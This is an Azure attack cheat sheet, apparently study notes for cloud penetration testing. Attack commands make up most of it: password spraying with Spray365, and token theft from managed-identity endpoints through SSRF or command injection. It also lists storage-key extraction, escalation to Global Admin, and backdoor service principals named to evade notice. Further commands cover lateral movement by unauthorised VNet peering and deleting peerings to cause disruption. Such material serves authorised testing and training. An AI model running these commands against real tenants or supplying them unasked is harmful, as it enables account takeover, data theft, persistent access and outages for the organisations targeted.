## 1. Azure Reconnaissance

### AADInternals
A PowerShell module used for administering, recon, and exploitation of Azure AD and Office 365.
*   **Tenant Recon:** `Invoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table` (Fetches all verified domains).
*   **Get Login Info:** `Get-AADIntLoginInformation -Domain <domain name>`
*   **List Tenant Domains:** `Get-AADIntTenantDomains -Domain <domain name>`
*   *Other Commands:* `Get-AADIntServiceLocations`, `Get-AADIntCompanyTags`, `Get-AADIntTenantAuthPolicy`.

### Azure Active Directory (AD) Enumeration
*   **AzureGraph:** A tool that uses Microsoft Graph API to extract users, devices, applications, and domains.
    *   Login: `gr <-create_graph_login()`
    *   List users: `gr$list_users()`
    *   Get user apps: `me$list_owned_objects(type="application_name")`
*   **Password Spraying (Spray365):** Automated password guessing against Azure AD accounts.
    *   Generate plan: `python spray365.py generate normal -ep <plan_file> -d <domain> -u <users_file> -pf <passwords_file>`
    *   Spray: `python3 spray365.py spray -ep <plan_file>`

## 2. Identifying Azure Services and Resources

### MicroBurst
A collection of PowerShell scripts for enumerating Azure services, targeting misconfigurations and weak passwords.
*   **Enumerate Services:** `Get-AzDomainInfo -Verbose -Folder microburst-output` (saves output to CSVs).

### Collecting Data with AzureHound
Collects data from Azure AD and Azure Resource Manager (AzureRM) for visualization in BloodHound.
*   List Tenant Data: `azure-hound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o "mytenant.json"`
*   Start BloodHound collection: `azurehound configure` -> `azurehound start`

### Publicly Exposed Blob Storage (Goblob)
A fast enumeration tool to find sensitive info exposed in Azure Blobs.
*   Single account: `./goblob <storageaccountname>`
*   Multiple accounts: `./goblob -accounts accounts.txt`
*   Custom containers: `./goblob -accounts accounts.txt -containers wordlists/goblob-folder-names.txt -output results.txt`

## 3. Identifying Attack Surfaces & Open NSGs

### Stormspotter
Maps Azure and Azure AD objects to create a visual graph of resources and identify attack surfaces.
*   CLI Mode: `python3 sscollector.pyz cli`
*   SPN Auth Mode: `python3 sscollector.pyz spn -t <tenant> -c <clientID> -s <clientSecret>`

### Identifying Open Network Security Groups (NSGs)
Attackers scan for NSGs permitting inbound traffic on common ports (SSH 22, HTTP 80, MySQL 3306).
*   **Using Azure CLI:**
    *   List all NSGs: `az network nsg list --out table`
    *   View specific NSG rules: `az network nsg show --resource-group <GroupName> --name <NSGName>`
    *   Filter for `0.0.0.0/0` access: `az network nsg rule list --resource-group <Group> --nsg-name <Name> --query "[?direction=='Inbound' && sourceAddressPrefix=='*']" --output table`

## 4. Exploitation & Privilege Escalation

### Exploiting Managed Identities and Azure Functions
Attackers abuse command-injection vulnerabilities in Azure Functions to access the local `$IDENTITY_ENDPOINT` and extract access tokens.
1.  **Extract Token via SSRF:** `curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER`
2.  **Authenticate locally:** `Connect-AzAccount -AccessToken <token> -AccountId <client_id>`
3.  **List Resources:** `Get-AzResource`
4.  **Extract Storage Keys:** `Get-AzStorageAccountKey -ResourceGroupName "<group>" – AccountName "<account_name>"`
5.  *Result:* The attacker uses the storage keys to connect via Azure Storage Explorer and download sensitive blob containers.

### Privilege Escalation Using Misconfigured User Accounts
1.  Use `Connect -AzureAD`.
2.  Create a self-signed cert (`Export-PfxCertificate`).
3.  Upload the cert to the registered application in Azure AD.
4.  Escalate to Global Admin: `Add-AzureADDirectoryRoleMember -RefObjectId <user_ID> -ObjectId <Globaladmin_ID>`.

## 5. Creating Persistent Backdoors & Lateral Movement

### Backdoors using Service Principals
Attackers assign themselves or a controlled service principal to privileged Azure AD roles.
*   Find roles: `az role definition list`
*   Create Service Principal: `az ad sp create-for-rbac --name <name>`
*   Assign 'Owner' Role: `az role assignment create --assignee <sp_id> --role "Owner"`
*   *Evasion:* Name the principal something legitimate like `ProductionServicePrincipal`.

### Exploiting VNet Peering Connections
Virtual Network (VNet) peering connects VMs. Attackers exploit VNets to move laterally.
*   Create unauthorized peering: `az network vnet peering create -g <Group> -n AttackerToTarget --vnet-name AttackerVnet --remote-vnet <TargetID> --allow-vnet-access`
*   Enable traffic forwarding: `az network vnet peering update ... allowForwardedTraffic=true`
*   Delete legitimate peerings (Disruption/DoS): `az network vnet peering delete ...`

## 6. AzureGoat Scenarios

AzureGoat is a vulnerable-by-design Azure infrastructure showcasing OWASP Top 10 risks.
*   **Insecure Direct Object Reference (IDOR):** Exploiting parameters to access other users' accounts and change passwords.
*   **Server-Side Request Forgery (SSRF):** Exploiting image upload features to query local metadata endpoints.
*   **Security Misconfiguration:** Fetching storage container component lists from misconfigured resource groups.
*   **Privilege Escalation:** Changing a user role from "Contributor" to "Owner".
